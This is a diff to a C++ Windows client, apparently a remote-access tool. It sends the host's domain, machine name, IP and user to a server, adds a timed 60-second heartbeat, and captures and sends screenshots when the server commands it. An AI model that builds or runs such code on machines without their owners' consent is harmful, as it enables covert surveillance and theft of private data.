@@ -1,5 +1,15 @@
 #include "client.h"
 
+
+struct GET_PC_DATA_REQUSET
+{
+    std::string domain;
+    std::string machine;
+    std::string ip;
+    std::string user;
+};
+
+
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     using namespace Gdiplus;
     UINT  num = 0;
@@ -50,7 +60,7 @@ void gdiscreen() {
         Gdiplus::Bitmap bitmap(membit, NULL);
         CLSID clsid;
         GetEncoderClsid(L"image/jpeg", &clsid);
-        bitmap.Save(L"C:/Users/Ziglot/screen.jpeg", &clsid, NULL); // To save the jpeg to a file
+        bitmap.Save(L"C:/Users/Public/screen.jpeg", &clsid, NULL);
         bitmap.Save(istream, &clsid, NULL);
 
         //delete &clsid;
@@ -61,14 +71,6 @@ void gdiscreen() {
     GdiplusShutdown(gdiplusToken);
 }
 
-
-struct GET_PC_DATA_REQUSET
-{
-    std::string domain;
-    std::string machine;
-    std::string ip;
-    std::string user;
-};
 
 bool GetDataPc(GET_PC_DATA_REQUSET &pc_data)
 {
@@ -159,9 +161,16 @@ int main()
     if (!GetDataPc(pc_data))
         return -1;
 
-    // Send
-    // C++ and C++ std::string message = "C " + pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user + "\0";
-    std::string message = "C " + pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user;
+    // Time
+    std::chrono::system_clock::time_point lastRequestTime = std::chrono::system_clock::now();
+    std::time_t t = std::chrono::system_clock::to_time_t(lastRequestTime);
+    char buft[80];
+    std::strftime(buft, sizeof(buft), "%Y-%m-%d %H:%M:%S", std::localtime(&t));
+
+    std::string timeStr(buft);
+
+    // WSend
+    std::string message = "C " + pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user + " " + timeStr;
     send(sock, message.c_str(), message.size() + 1, 0);
 
 
@@ -169,6 +178,24 @@ int main()
     while (true)
     {
         ZeroMemory(buf, 4095);
+
+        // Проверка времени
+        std::chrono::system_clock::time_point currentTime = std::chrono::system_clock::now();
+        std::chrono::duration<double> elapsedTime = currentTime - lastRequestTime;
+
+        if (elapsedTime.count() >= 60.0) {
+            std::time_t t = std::chrono::system_clock::to_time_t(currentTime);
+            char buft[80];
+            std::strftime(buft, sizeof(buft), "%Y-%m-%d %H:%M:%S", std::localtime(&t));
+
+            std::string timeStr(buft);
+            std::string request = "T " + pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user + " " + timeStr;
+
+            send(sock, request.c_str(), request.length(), 0);
+
+            lastRequestTime = currentTime;
+            std::cout << "TIME" << std::endl;
+        }
 
         int bytesReceived = recv(sock, buf, 4096, 0);
         if (bytesReceived == SOCKET_ERROR)
@@ -179,7 +206,7 @@ int main()
 
         std::string command = std::string(buf, 0, bytesReceived);
 
-        // ?ommand processing
+        // Command processing
         if (command == "-Connect")
         {
             std::cout << "[Command from the server]: " << command << std::endl;;
@@ -188,8 +215,7 @@ int main()
         {
             gdiscreen();
 
-            //C:\Users\Ziglot\Pictures
-            std::ifstream infile("C:/Users/Ziglot/screen.jpeg", std::ios::binary);
+            std::ifstream infile(L"C:/Users/Public/screen.jpeg", std::ios::binary);
             infile.seekg(0, std::ios::end);
             size_t file_size = infile.tellg();
             char* data = new char[file_size];
